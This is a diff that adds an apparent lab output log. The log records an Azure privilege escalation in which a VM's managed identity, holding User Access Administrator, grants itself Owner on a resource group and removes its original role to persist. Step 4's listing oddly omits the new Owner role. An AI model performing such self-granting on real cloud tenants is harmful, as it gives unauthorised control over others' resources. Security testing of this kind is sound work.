@@ -1,0 +1,31 @@
+[*] target VM:                <VM_PUBLIC_IP>
+[*] foothold:                 VM System-Assigned MI with UAA on RG 'pathtriage-rg'
+[*] MI principalId:           <MI_PRINCIPAL_ID>
+[*] acting from the VM itself (no external attacker host required)
+
+[*] Step 1: query IMDS for Managed Identity token (ARM-scoped)
+[+] MI ARM token acquired
+    token length:             2054 chars
+    resource:                 https://management.azure.com/
+
+[*] Step 2: list role assignments held by this MI at RG scope
+[+] MI currently holds 1 role assignment(s) at this scope
+    - User Access Administrator      (assignment id ...4c10abca0b43)
+
+[*] Step 3: PUT a new roleAssignment granting Owner to self at RG scope
+[+] Owner role granted to self
+    new assignment guid:      3821b0c3-64bc-4a79-b9a7-c814b86a9a1c
+    role:                     Owner (8e3af657-a8ff-443c-a75c-2fe8c4bcb635)
+    principalId (self):       <MI_PRINCIPAL_ID>
+
+[*] Step 4: list role assignments held by this MI at RG scope
+[+] MI currently holds 1 role assignment(s) at this scope
+    - User Access Administrator      (assignment id ...4c10abca0b43)
+
+[*] Step 5: DELETE the original UAA assignment as new Owner
+[+] UAA assignment removed (Owner persists)
+    revoked assignment id:    ...4c10abca0b43
+
+[+] Path Z3 verified: VM MI (User Access Administrator on RG) ->
+                      self PUT roleAssignments ->
+                      Owner on RG (RBAC modification persistent)
